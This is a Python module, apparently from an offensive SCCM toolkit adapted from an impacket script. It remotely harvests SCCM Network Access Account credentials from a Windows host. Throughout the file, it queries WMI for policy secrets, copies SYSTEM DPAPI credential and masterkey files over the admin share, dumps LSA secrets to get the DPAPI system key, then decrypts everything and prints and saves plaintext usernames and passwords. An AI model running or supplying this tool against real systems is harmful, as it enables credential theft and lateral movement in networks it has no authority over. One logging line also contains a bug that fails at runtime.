import logging
import os
import sys
import ntpath
from binascii import unhexlify, hexlify
from io import BytesIO
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY
from impacket.smbconnection import SMBConnection
from impacket.dpapi import MasterKeyFile, MasterKey, CredentialFile, DPAPI_BLOB
from impacket.uuid import bin_to_string
from impacket.examples.secretsdump import RemoteOperations, LSASecrets
from impacket.krb5.keytab import Keytab
from lib.logger import logger
from lib.scripts.sccmwtf import Tools
from getpass import getpass


# Original Script: https://github.com/ThePorgs/impacket/blob/master/examples/SystemDPAPIdump.py
# Module Author: @s1zzzz

class DPAPI:

    def __init__(self, remoteName, username=None, password='', domain='', kerberos=False,
                 no_pass=False, hashes=None, aes=None, debug=False, kdc=None, logs_dir=None):
        self.__remoteName = remoteName
        self.__remoteHost = remoteName
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.no_pass = no_pass
        self.hashes = hashes
        self.__aesKey = aes
        self.__smbConnection = None
        self.__remoteOps = None
        self.__LSASecrets = None
        self.__userkey = None
        self.__isRemote = True
        self.__doKerberos = kerberos
        self.__dumpLSA = True
        self.__kdcHost = kdc
        self.key = None
        self.raw_sccm_blobs = []
        self.raw_credentials = {}
        self.raw_masterkeys = {}
        self.masterkeys = {}
        self.logs_dir = logs_dir
        self.lmhash = ""
        self.nthash = ""

        if self.hashes:
            self.lmhash, self.nthash = self.hashes.split(':')
        if not (self.__password or self.hashes or self.__aesKey or self.no_pass):
                self.__password = getpass("Password:")

   
    def run(self):
        self.dump()

    def addPolicySecret(self, secret):
        if secret.startswith("<PolicySecret"):
            self.raw_sccm_blobs.append(unhexlify(secret[43:-18]))
        else:
            print("Not a PolicySecret, skipping")

    def connect(self):
        logger.debug('[*] Establishing SMB connection')
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.lmhash,
                                               self.nthash, self.__aesKey, self.__kdcHost)
        else:
            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.lmhash, self.nthash)

    def getFileContent(self, share, path, filename):
        content = None
        try:
            fh = BytesIO()
            filepath = ntpath.join(path,filename)
            self.__smbConnection.getFile(share, filepath, fh.write)
            content = fh.getvalue()
            fh.close()
        except:
            return None
        return content
    
    def cleanup(self):
        logger.debug('[*] Cleaning up after LSA secret dumping...')
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()

    def getDPAPI_SYSTEM(self, secretType, secret):
        if secret.startswith("dpapi_machinekey:"):
            machineKey, userKey = secret.split('\n')
            userKey = userKey.split(':')[1]
            self.key = unhexlify(userKey[2:])

    def dump(self):
        try:
            namespace = 'root\\ccm\\Policy\\Machine\\RequestedConfig'
            query = 'SELECT NetworkAccessUsername,NetworkAccessPassword FROM CCM_NetworkAccessAccount'
            logger.info("[*] Querying SCCM configuration via WMI")
            logger.debug('[*] Establishing DCOM connection')
            dcom = DCOMConnection(self.__remoteHost, self.__username, self.__password, self.__domain, self.lmhash,
                                                self.nthash, self.__aesKey, oxidResolver=True,
                                                    doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices= iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)
            # if self.__options.rpc_auth_level == 'privacy':
            #     iWbemServices.get_dce_rpc().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            # elif self.__options.rpc_auth_level == 'integrity':
            #     iWbemServices.get_dce_rpc().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)
        
            iWbemLevel1Login.RemRelease()
            iEnum = iWbemServices.ExecQuery(query)


            while True:
                try:
                    pEnum = iEnum.Next(0xffffffff,1)[0]
                    record = pEnum.getProperties()
                    for key in record:
                        if type(record[key]['value']) is list:
                            for item in record[key]['value']:
                                self.addPolicySecret(item)
                        else:
                            self.addPolicySecret(record[key]['value'])
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    if str(e).find('S_FALSE') < 0:
                        raise
                    else:
                        break
            
            iEnum.RemRelease()
            iWbemServices.RemRelease()
            dcom.disconnect()



        except Exception as e:
            if type(e) is wmi.DCERPCSessionError and e.error_code == 0x8004100e:
                logger.info("[!] CCM namespace not found, this usually means there is no SCCM configuration on the machine.")
            try:
                dcom.disconnect()
            except:
                pass

        

        if len(self.raw_sccm_blobs) == 0:
            logger.info("[!] No SCCM secrets found")

        else:
            logger.info("[+] Got " + str(len(self.raw_sccm_blobs)) + " SCCM secrets.")


        try:
            self.__isRemote = True
            bootKey = None
            try:
                try:
                    self.connect()
                except Exception as e:
                    if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                        # SMBConnection failed. That might be because there was no way to log into the
                        # target system. We just have a last resort. Hope we have tickets cached and that they
                        # will work
                        logger.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
                        pass
                    else:
                        raise
                
                # get SYSTEM credentials (if requested) & masterkeys
                share = 'C$'
                cred_path = '\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\'
                mk_path = '\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\'
                tid = self.__smbConnection.connectTree(share)       

                logger.debug("[*] Extracting credential files")
                for f in self.__smbConnection.listPath(share, ntpath.join(cred_path,'*')):
                    if f.is_directory() == 0:
                        filename = f.get_longname()
                        logger.info("[+] Credential file found: " + filename)
                        logger.info("[+] Retrieving credential file: " + filename)
                        data = self.getFileContent(share, cred_path, filename)
                        if data:
                            self.raw_credentials[filename] = data
                        else:
                            logger.info("[!] Could not get content of credential file: " + filename + ", skipping")


                # for each credential, get corresponding masterkey file
                useless_credentials = []
                for k,v in self.raw_credentials.items():
                    cred = CredentialFile(v)
                    blob = DPAPI_BLOB(cred['Data'])
                    mkid = bin_to_string(blob['GuidMasterKey'])
                    if mkid not in self.raw_masterkeys:
                        logger.info("[+] Retrieving masterkey file: " + mkid)
                        self.raw_masterkeys[mkid] = self.getFileContent(share, mk_path, mkid)
                    if self.raw_masterkeys[mkid] is None:
                        logger.info("[!] Could not get content of masterkey file: " + mkid + ", skipping")
                        useless_credentials.append(k)
                for k in useless_credentials:
                    del self.raw_credentials[k]


                # for each SCCM secret, get corresponding masterkey file
                readable_secrets = []
                for v in self.raw_sccm_blobs:
                    blob = DPAPI_BLOB(v)
                    mkid = bin_to_string(blob['GuidMasterKey'])
                    if mkid not in self.raw_masterkeys:
                        logger.info("[*] Retrieving masterkey file: " + mkid)
                        self.raw_masterkeys[mkid] = self.getFileContent(share, mk_path, mkid)
                    if self.raw_masterkeys[mkid] is None:
                        logger.info("[!] Could not get content of masterkey file: " + mkid + ", skipping")
                    else:
                        readable_secrets.append(v)
                self.raw_sccm_blobs = readable_secrets


                # check whether there's something left to decrypt
                if len(self.raw_credentials) == 0 and len(self.raw_sccm_blobs) == 0:
                    logger.info("[!] Nothing to decrypt, quitting")
                    return


                # prepare to dump LSA secrets to get SYSTEM userkey if not provided
                if self.__userkey is None:
                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
                    self.__remoteOps.enableRegistry()
                    bootKey = self.__remoteOps.getBootKey()
                else:
                    self.key = unhexlify(self.__userkey[2:])
            except Exception as e:
                self.__dumpLSA = False
                logger.info('[!] RemoteOperations failed: %s' % str(e))



            if self.__dumpLSA:
                logger.debug('[*] Attempting to dump LSA secrets from the target machine')
                try:
                    SECURITYFileName = self.__remoteOps.saveSECURITY()
                    self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
                                                    isRemote=self.__isRemote, history=False,
                                                    perSecretCallback = self.getDPAPI_SYSTEM)
                    self.__LSASecrets.dumpSecrets()
                    logger.info('[+] DPAPI UserKey: 0x' + hexlify(self.key).decode('utf-8'))
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    logger.info('[!] LSA hashes extraction failed: %s' % str(e))

            self.cleanup()


        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            print(e)
            try:
                self.cleanup()
            except:
                pass   


        # decrypt collected secrets & creds
        if self.key is None:
            logger.info("[!] Could not get SYSTEM userkey")
            return
        for k,v in self.raw_masterkeys.items():
            if v is None:
                self.masterkeys[k] = None
                continue
            data = v
            mkf = MasterKeyFile(data)
            data = data[len(mkf):]
            if not mkf['MasterKeyLen'] > 0:
                logger.info("[!] Masterkey file " + k + " does not contain a masterkey")
                continue
            mk = MasterKey(data[:mkf['MasterKeyLen']])
            data = data[len(mk):]
            decryptedKey = mk.decrypt(self.key)
            if not decryptedKey:
                logger.info("[!] Could not decrypt masterkey " + k)
                continue
            logger.info("[+] Decrypted masterkey " + k + ": 0x" + hexlify(decryptedKey).decode('utf-8'))
            self.masterkeys[k] = decryptedKey
        i = -1


        logger.debug("[*] Attempting to decrypt SCCM secrets")
        sccm_creds = []
        creds = {}

        for v in self.raw_sccm_blobs:
            i += 1
            blob = DPAPI_BLOB(v)
            mkid = bin_to_string(blob['GuidMasterKey'])
            key = self.masterkeys.get(mkid, None)
            if key is None:
                logger.info("[!] Could not decrypt masterkey " + mkid + ", skipping SCCM secret " + str(i))
                continue
            decrypted = blob.decrypt(key)
            if decrypted is not None:
                decoded_string = decrypted.decode('utf-16le').replace('\x00', '').replace('\\\\', '\\')
                if i % 2 == 0:
                    creds = {'password': decoded_string}
                else:
                    creds['username'] = decoded_string
                    sccm_creds.append(creds)
                    creds = {}
            else:
                logger.info("[!] Could not decrypt SCCM secret " +  + str(i))
        
        for cred in sccm_creds:
            logger.info(f"[+] Got NAA credential - Username: {cred['username']} | Password: {cred['password']}")
        
        if len(sccm_creds) > 0:
            Tools.write_to_csv(sccm_creds, self.logs_dir)
